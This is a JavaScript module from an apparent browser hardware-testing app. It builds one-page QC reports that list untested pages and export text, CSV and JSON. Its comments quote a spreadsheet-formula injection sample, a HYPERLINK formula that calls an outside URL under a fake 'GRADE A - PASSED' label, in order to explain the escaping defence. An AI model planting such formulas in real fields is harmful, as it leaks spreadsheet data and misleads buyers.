/* Testbench — unit report.

   Turns a bench session into a one-page QC record: what was tested, what it
   scored, what was flagged, and what was NOT tested.

   That last part is the whole design. A report that lists only the tests you
   happened to run reads as a clean bill of health for the unit as a whole,
   and a buyer or a returns desk will read it that way. So every page of the
   app appears in the report, and the ones you did not open are printed as
   "not tested" in plain words. "Not tested" and "passed" are very different
   things to put in front of somebody paying money.

   It is built from TB.results(), which is populated by TB.verdict() - the one
   function every scored result in the app goes through. Nothing opts in. A
   report assembled from modules that remember to report in is a report that
   silently omits whatever was added most recently, which is exactly when you
   would stop noticing. */
"use strict";
(function () {
var $ = TB.$, $$ = TB.$$, el = TB.el, toast = TB.toast;
if (!$("#rep-build")) return;

/* Every testable page, with what a result there actually tells you. Kept here
   rather than read off the rail so a page with no scored verdict still gets a
   line in the report. */
var PAGES = [
  ["keyboard", "Keyboard", "every key registers, no chatter, no stuck keys"],
  ["mouse", "Mouse", "buttons, scroll, tracking, double-click, side buttons"],
  ["gamepad", "Controllers", "sticks centred, no drift, every button and trigger"],
  ["joycon", "Joy-Cons", "sticks, buttons, battery and calibration over HID"],
  ["wheel", "Wheels", "steering travel, pedals, buttons, force feedback"],
  ["audio", "Mic & headsets", "microphone level, both earcups, no distortion"],
  ["airpods", "Earbuds", "driver response against a reference pair, serial check"],
  ["midi", "MIDI", "every key and control sends, no stuck notes"],
  ["monitor", "Monitors", "dead and stuck pixels, uniformity, banding, backlight"],
  ["camera", "Webcams", "image, resolution and frame rate"],
  ["touch", "Touch", "every touch point registers across the whole panel"],
  ["network", "Routers", "speed, latency, latency under load, dropouts"],
  ["stress", "Stress test", "holds up under sustained CPU and GPU load"],
  ["system", "System", "what the machine reports about its own hardware"]
];

/* ---- spreadsheet-formula injection ----------------------------------------
   This report gets COPIED OUT and pasted into listings, emails and
   spreadsheets, which makes the typed fields a path into somebody else's
   Excel. A cell beginning with =, +, - or @ is treated as a formula on paste,
   so "=HYPERLINK("http://x/?s="&A1,"GRADE A - PASSED")" in the SKU field
   pastes as a clickable cell reading GRADE A - PASSED that calls out when
   clicked. Measured surviving verbatim into the clipboard before this.

   The realistic route is not an attacker typing into this box - it is a SKU
   or lot string copied out of a supplier's spreadsheet and pasted into it. A
   leading apostrophe is the standard neutraliser: Excel and Sheets treat the
   rest as text and do not display the apostrophe, and in the plain-text
   version it is visible, which is the honest outcome for a field that starts
   with an equals sign. */
function safeCell(v) {
  var t = String(v == null ? "" : v);
  /* Also strip the control characters that let a value forge a new line in
     the text report - a field containing a newline plus "OVERALL: PASSES"
     would otherwise read as the report's own verdict. */
  t = t.replace(/[\r\n\t\u2028\u2029\u0000-\u001f]+/g, " ").trim();
  if (/^[=+\-@]/.test(t)) t = "'" + t;
  return t;
}

function pad(n) { return n < 10 ? "0" + n : String(n); }
function when(ms) {
  var d = new Date(ms);
  return d.getFullYear() + "-" + pad(d.getMonth() + 1) + "-" + pad(d.getDate()) +
         " " + pad(d.getHours()) + ":" + pad(d.getMinutes());
}

function meta() {
  return {
    unit: safeCell($("#rep-unit").value),
    grade: safeCell($("#rep-grade").value),
    by: safeCell(($("#rep-by").value || "").toUpperCase()),
    note: safeCell($("#rep-note").value)
  };
}

function countLine() {
  var r = TB.results();
  var n = r.length;
  var bad = r.filter(function (x) { return x.kind === "bad"; }).length;
  var warn = r.filter(function (x) { return x.kind === "warn"; }).length;
  var text = !n ? "nothing recorded yet"
    : n + " result" + (n === 1 ? "" : "s") +
      (bad ? " \u00b7 " + bad + " faulty" : "") + (warn ? " \u00b7 " + warn + " to check" : "");
  var cls = !n ? "tb-sppill" : "tb-sppill " + (bad ? "fail" : warn ? "warn" : "pass");
  /* the pill on the report page, and the twin on the Bench callout */
  ["#rep-count", "#rep-count-home"].forEach(function (id) {
    var p = $(id); if (p) { p.textContent = text; p.className = cls; }
  });
  /* the rail badge: a small count so you can see from any page that results
     are waiting, coloured if anything needs attention */
  if (TB.badge) TB.badge("report", n ? String(n) : "", !!(n && (bad || warn)));
  var tb = $("#topbar-report");
  if (tb) {
    tb.textContent = n ? "Report \u00b7 " + n : "Report";
    tb.classList.toggle("has", !!n);
    tb.classList.toggle("bad", !!bad);
    tb.classList.toggle("warn", !bad && !!warn);
  }
}

/* ---------- the overall call ---------- */
/* Deliberately conservative, and it never upgrades itself on the strength of
   how much passed. One faulty result makes the unit faulty however many other
   pages came back clean, because a controller with a dead trigger is not
   "mostly working" - it is a controller with a dead trigger. */
function overall(res) {
  if (!res.length) return { word: "Not tested", cls: "", why: "No test on this unit produced a result." };
  var bad = res.filter(function (r) { return r.kind === "bad"; });
  var warn = res.filter(function (r) { return r.kind === "warn"; });
  if (bad.length) {
    return { cls: "fail", word: "Faulty",
      why: bad.length + " test" + (bad.length === 1 ? "" : "s") + " failed outright: " +
           bad.map(function (r) { return r.panel; }).join(", ") + "." };
  }
  if (warn.length) {
    return { cls: "warn", word: "Needs a look",
      why: warn.length + " test" + (warn.length === 1 ? "" : "s") + " came back marginal: " +
           warn.map(function (r) { return r.panel; }).join(", ") + ". Nothing failed outright." };
  }
  return { cls: "pass", word: "Passes",
    why: "Every test run on this unit passed. That covers what was tested and nothing more — see the untested list below." };
}

function build() {
  var res = TB.results();
  var m = meta();
  var box = $("#rep-out");
  box.textContent = "";

  var tested = Object.create(null);
  res.forEach(function (r) { tested[r.view] = true; });
  var untested = PAGES.filter(function (p) { return !tested[p[0]]; });
  var o = overall(res);

  var doc = el("div", "tb-report");

  /* ---- header ---- */
  var head = el("div", "tb-rephead");
  var left = el("div");
  left.appendChild(el("b", null, "Hardware test report"));
  var sub = el("span", null, "Testbench · " + when(Date.now()));
  left.appendChild(sub);
  if (m.unit) {
    var no = el("span", null, "Report " + m.unit);
    no.className = "repno";
    left.appendChild(no);
  }
  head.appendChild(left);
  var call = el("div", "tb-repcall " + o.cls);
  call.appendChild(el("b", null, o.word));
  call.appendChild(el("span", null, res.length + " test" + (res.length === 1 ? "" : "s") + " run"));
  head.appendChild(call);
  doc.appendChild(head);

  /* ---- unit details ---- */
  var dl = el("dl", "tb-kv");
  function kv(k, v) { dl.appendChild(el("dt", null, k)); dl.appendChild(el("dd", null, v)); }
  kv("Report number", m.unit || "not recorded");
  kv("Condition grade", m.grade || "not graded");
  kv("Tested by", m.by || "not recorded");
  kv("Tested on", when(Date.now()));
  if (m.note) kv("Notes", m.note);
  kv("Overall", o.why);
  doc.appendChild(dl);

  /* ---- what was tested ---- */
  doc.appendChild(el("h3", "tb-ptitle", "Results"));
  if (!res.length) {
    doc.appendChild(el("p", "tb-empty", "No test produced a scored result in this session. Open a test page, run it, and build the report again."));
  } else {
    var table = el("div", "tb-reptable");
    res.forEach(function (r) {
      var row = el("div", "tb-reprow " + r.kind);
      var h = el("div", "who");
      h.appendChild(el("b", null, safeCell(r.panel)));
      h.appendChild(el("span", null, r.view));
      row.appendChild(h);
      var sc = el("div", "sc " + r.kind);
      sc.appendChild(el("b", null, String(r.score)));
      sc.appendChild(el("span", null, r.word));
      row.appendChild(sc);
      var fl = el("div", "fl");
      var bad = r.flags.filter(function (f) { return f.level !== "ok"; });
      if (!bad.length) {
        fl.appendChild(el("span", "ok", "Nothing flagged."));
      } else {
        bad.forEach(function (f) {
          var li = el("div", f.level === "bad" ? "bad" : "warn");
          li.appendChild(el("b", null, safeCell(f.tag)));
          li.appendChild(document.createTextNode(" " + safeCell(f.text)));
          fl.appendChild(li);
        });
      }
      row.appendChild(fl);
      table.appendChild(row);
    });
    doc.appendChild(table);
  }

  /* ---- what was NOT tested ---- */
  doc.appendChild(el("h3", "tb-ptitle", "Not tested"));
  if (!untested.length) {
    doc.appendChild(el("p", null, "Every page in the bench produced a result for this unit."));
  } else {
    var p = el("p", "tb-note",
      "These were not run, so this report says nothing about them. They are listed because a report that only shows what was tested reads as a clean bill of health for the whole unit, and it is not one.");
    doc.appendChild(p);
    var ul = el("ul", "tb-steps");
    untested.forEach(function (x) {
      var li = el("li");
      li.appendChild(el("span", "tag", "not tested"));
      li.appendChild(el("span", null, x[1] + " — would have covered " + x[2] + "."));
      ul.appendChild(li);
    });
    doc.appendChild(ul);
  }

  /* ---- device events ---- */
  var log = TB.watchLog().slice(0, 40);
  if (log.length) {
    doc.appendChild(el("h3", "tb-ptitle", "Devices seen, and when"));
    doc.appendChild(el("p", "tb-note",
      "Straight from the connection watchdog. A device that appears and disappears here is a loose port or a failing cable, and that is worth more than any score on the page — it is the fault that tests fine for ten seconds and comes back a week later."));
    var lg = el("div", "tb-log");
    log.forEach(function (e) {
      var d = el("div");
      /* The device name is a string the hardware chose, and it ends up in a
         printed or copied report like any other cell. */
      d.appendChild(el("b", null, e.t + "  " + safeCell(e.tag)));
      d.appendChild(document.createTextNode("  " + safeCell(e.text)));
      lg.appendChild(d);
    });
    doc.appendChild(lg);
  }

  /* ---- what the report is worth ---- */
  doc.appendChild(el("h3", "tb-ptitle", "What this report is, and is not"));
  var ul2 = el("ul", "tb-steps");
  [
    ["ok", "measured", "Every score above was produced by the bench from a live device, not entered by hand. The only typed fields are the unit, the grade, the initials and the notes."],
    ["warn", "scope", "It covers what a browser can reach: inputs, audio, screens, cameras and network behaviour. It cannot see battery health, internal wear, water damage, board-level faults or anything inside a sealed case."],
    ["warn", "not a certificate", "This is an internal bench record, not a certification, a warranty or an authenticity guarantee. It is honest about what was checked; it does not make the unit fit for any particular purpose."],
    ["ok", "private", "Produced entirely on this machine. Nothing was uploaded to produce it and nothing is kept once this tab closes unless you print or copy it."]
  ].forEach(function (x) {
    var li = el("li", x[0]);
    li.appendChild(el("span", "tag", x[1]));
    li.appendChild(el("span", null, x[2]));
    ul2.appendChild(li);
  });
  doc.appendChild(ul2);

  box.appendChild(doc);
  countLine();
  return { res: res, untested: untested, overall: o, meta: m };
}

/* ---------- plain text, for a listing or an email ---------- */
function asText() {
  var res = TB.results(), m = meta(), o = overall(res);
  var tested = Object.create(null);
  res.forEach(function (r) { tested[r.view] = true; });
  var L = [];
  L.push("HARDWARE TEST REPORT");
  L.push("Tested on   " + when(Date.now()));
  if (m.unit) L.push("Report no.  " + m.unit);
  if (m.grade) L.push("Condition   " + m.grade);
  if (m.by) L.push("Tested by   " + m.by);
  if (m.note) L.push("Notes       " + m.note);
  L.push("");
  L.push("OVERALL: " + o.word.toUpperCase());
  L.push(o.why);
  L.push("");
  L.push("RESULTS");
  if (!res.length) L.push("  (none — no test produced a result)");
  res.forEach(function (r) {
    L.push("  " + r.panel + " — " + r.word + " (" + r.score + "/100)");
    r.flags.filter(function (f) { return f.level !== "ok"; }).forEach(function (f) {
      L.push("      ! " + f.tag + ": " + f.text);
    });
  });
  var un = PAGES.filter(function (p) { return !tested[p[0]]; });
  if (un.length) {
    L.push("");
    L.push("NOT TESTED — this report says nothing about these:");
    un.forEach(function (x) { L.push("  - " + x[1]); });
  }
  L.push("");
  L.push("Produced by Testbench on the machine that ran the tests. Covers what a");
  L.push("browser can reach: inputs, audio, screens, cameras, network. It cannot see");
  L.push("battery health, internal wear or anything inside a sealed case. An internal");
  L.push("bench record, not a certification or a warranty.");
  return L.join("\n");
}

/* ---------- export ---------------------------------------------------------
   CSV for the inventory spreadsheet, JSON for anything that reads it
   programmatically. Deliberately NOT a PDF library: the browser's own print
   dialog already produces a better PDF than jsPDF would, for free, with the
   print stylesheet already written for it - and a 400 KB dependency in a site
   that currently has zero is a poor trade for a worse file.

   CSV is written by hand rather than by concatenating with commas, because
   every field here can contain the thing that breaks naive CSV: a comma in a
   note, a quote in a device name, a newline in a flag's text. RFC 4180 says
   wrap in quotes and double any quote inside, and that is what quote() does.
   The leading-formula neutralisation from safeCell applies on top, because a
   CSV opened in Excel runs formulas exactly like a paste does. */
function quote(v) {
  var t = safeCell(v);
  return '"' + t.replace(/"/g, '""') + '"';
}

function asCSV() {
  var res = TB.results(), m = meta(), o = overall(res);
  var tested = Object.create(null);
  res.forEach(function (r) { tested[r.view] = true; });
  var stamp = when(Date.now());

  var rows = [[
    "tested_at", "unit", "condition", "tested_by", "notes",
    "overall", "page", "test", "result", "score", "flags"
  ].map(quote).join(",")];

  function row(page, test, result, score, flags) {
    rows.push([stamp, m.unit, m.grade, m.by, m.note, o.word,
               page, test, result, score, flags].map(quote).join(","));
  }

  res.forEach(function (r) {
    var notes = r.flags.filter(function (f) { return f.level !== "ok"; })
      .map(function (f) { return f.tag + ": " + f.text; }).join(" | ");
    row(r.view, r.panel, r.word, String(r.score), notes);
  });

  /* Untested pages get a row too, with an empty score. A spreadsheet filtered
     to this unit has to show them, or the sheet repeats the exact problem the
     printed report was built to avoid: a list of passes reading as a pass for
     the whole unit. */
  PAGES.filter(function (x) { return !tested[x[0]]; }).forEach(function (x) {
    row(x[0], x[1], "NOT TESTED", "", "Would have covered " + x[2]);
  });

  return rows.join("\r\n") + "\r\n";
}

function asJSON() {
  var res = TB.results(), m = meta(), o = overall(res);
  var tested = Object.create(null);
  res.forEach(function (r) { tested[r.view] = true; });
  return JSON.stringify({
    tool: "Testbench",
    schema: 1,
    tested_at: new Date().toISOString(),
    unit: m.unit || null,
    condition: m.grade || null,
    tested_by: m.by || null,
    notes: m.note || null,
    overall: { verdict: o.word, reason: o.why },
    results: res.map(function (r) {
      return { page: r.view, test: r.panel, result: r.word, score: r.score,
               kind: r.kind, at: new Date(r.at).toISOString(), flags: r.flags };
    }),
    not_tested: PAGES.filter(function (x) { return !tested[x[0]]; })
      .map(function (x) { return { page: x[0], test: x[1], would_cover: x[2] }; }),
    limits: "Covers what a browser can reach: inputs, audio, screens, cameras, network. " +
            "It cannot see battery health, internal wear, water damage, board-level faults " +
            "or anything inside a sealed case. An internal bench record, not a certification."
  }, null, 2);
}

function download(name, text, type) {
  var blob = new Blob([text], { type: type + ";charset=utf-8" });
  var url = URL.createObjectURL(blob);
  var a = el("a");
  a.href = url;
  a.download = name;
  /* Not appended to the page. A link that stays in the DOM is a link somebody
     clicks again later pointing at a revoked blob. */
  a.click();
  /* Revoking immediately races the download in some builds; one tick is
     enough and the object is freed either way. */
  setTimeout(function () { URL.revokeObjectURL(url); }, 4000);
}

function slug() {
  /* A filename, not a transcription of the field.

     Mapping every unsafe character to a dash is safe but produces nonsense:
     a unit field holding a pasted formula came out as
     testbench_HYPERLINK-http-evil.test-s-A1-GRADE-A---PASSED_20261010.csv,
     which nobody can find again in a folder. Keep only letters, digits and
     single dashes, collapse the runs, and cap it short enough to read at a
     glance - the full unit string is inside the file on every row anyway. */
  var raw = ($("#rep-unit").value || "").trim();
  var base = raw.replace(/[^A-Za-z0-9]+/g, "-").replace(/^-+|-+$/g, "").slice(0, 24).replace(/-+$/, "");
  if (!base) base = "unit";
  var d = new Date();
  return base + "_" + d.getFullYear() + pad(d.getMonth() + 1) + pad(d.getDate()) +
         "-" + pad(d.getHours()) + pad(d.getMinutes());
}

$("#rep-csv").onclick = function () {
  /* The SKU is the report number; nothing leaves without one. */
  if (window.SKUGATE && !window.SKUGATE.ok("Export CSV")) return;
  if (!TB.results().length) { toast("Nothing to export", "No test has produced a result yet.", null); return; }
  download("testbench_" + slug() + ".csv", asCSV(), "text/csv");
  toast("CSV saved", "One row per test, including the pages that were not tested. Opens straight in Excel or Sheets.", "ok");
};

$("#rep-json").onclick = function () {
  /* The SKU is the report number; nothing leaves without one. */
  if (window.SKUGATE && !window.SKUGATE.ok("Export JSON")) return;
  if (!TB.results().length) { toast("Nothing to export", "No test has produced a result yet.", null); return; }
  download("testbench_" + slug() + ".json", asJSON(), "application/json");
  toast("JSON saved", "Every result with its flags and timestamps, for anything that reads the file rather than looks at it.", "ok");
};

$("#rep-build").onclick = function () {
  /* The SKU is the report number; nothing leaves without one. */
  if (window.SKUGATE && !window.SKUGATE.ok("Build the report")) return;
  var r = build();
  toast("Report built",
        r.res.length
          ? r.res.length + " result" + (r.res.length === 1 ? "" : "s") + " recorded, " + r.untested.length + " page" + (r.untested.length === 1 ? "" : "s") + " listed as not tested."
          : "Nothing has produced a result yet — run a test first.",
        r.res.length ? "ok" : null);
};

$("#rep-print").onclick = function () {
  /* The SKU is the report number; nothing leaves without one. */
  if (window.SKUGATE && !window.SKUGATE.ok("Print")) return;
  if (!$("#rep-out").firstChild) build();
  /* The print stylesheet hides the rail, the status bar and every panel except
     the report, so what comes out is the record and not a screenshot of the
     app. Printing is also how you get a PDF - every browser's print dialog
     offers "Save as PDF", and that needs no server. */
  document.documentElement.classList.add("tb-printing");
  var done = function () { document.documentElement.classList.remove("tb-printing"); };
  window.addEventListener("afterprint", done, { once: true });
  /* Safari has historically not fired afterprint; do not leave the page stuck
     in print mode if that happens. */
  setTimeout(done, 4000);
  window.print();
};

$("#rep-copy").onclick = function () {
  /* The SKU is the report number; nothing leaves without one. */
  if (window.SKUGATE && !window.SKUGATE.ok("Copy as text")) return;
  var txt = asText();
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(txt).then(function () {
      toast("Copied as text", "Paste it into a listing, an email or a returns note.", "ok");
    }).catch(function () {
      toast("Could not copy", "The browser blocked the clipboard. Build the report and print it instead.", null);
    });
  } else {
    toast("Clipboard not available", "Build the report and print it instead.", null);
  }
};

TB.arm($("#rep-reset"), "Start a new unit", "Press again \u2014 this clears the results", function () {
  TB.clearResults();
  /* Dispatch input as well as clearing the value. Other modules listen for
     it - the SKU badge in the status bar is painted from this field, and
     setting .value in script fires nothing, so the badge went on claiming a
     unit was being recorded after the unit had been cleared. A status bar
     naming the wrong unit is the exact failure the badge exists to prevent. */
  ["#rep-unit", "#rep-by", "#rep-note"].forEach(function (id) {
    $(id).value = "";
    $(id).dispatchEvent(new Event("input", { bubbles: true }));
  });
  $("#rep-grade").value = "";
  $("#rep-out").textContent = "";
  countLine();
  toast("Ready for the next unit",
        "The recorded results are cleared. The test pages themselves still show what they last measured \u2014 re-run anything you want in the new report.", "ok");
});

/* Refresh the count wherever you navigate \u2014 results accrue while you are on a
   test page, and the rail badge and top-bar button should reflect that the
   moment you look away from it. */
TB.$$(".tb-view").forEach(function (sec) {
  var v = sec.id.replace(/^view-/, "");
  TB.onEnter(v, countLine);
});
countLine();

/* for the test suite */
window.REPORT = { build: build, asText: asText, asCSV: asCSV, asJSON: asJSON, pages: PAGES };
})();
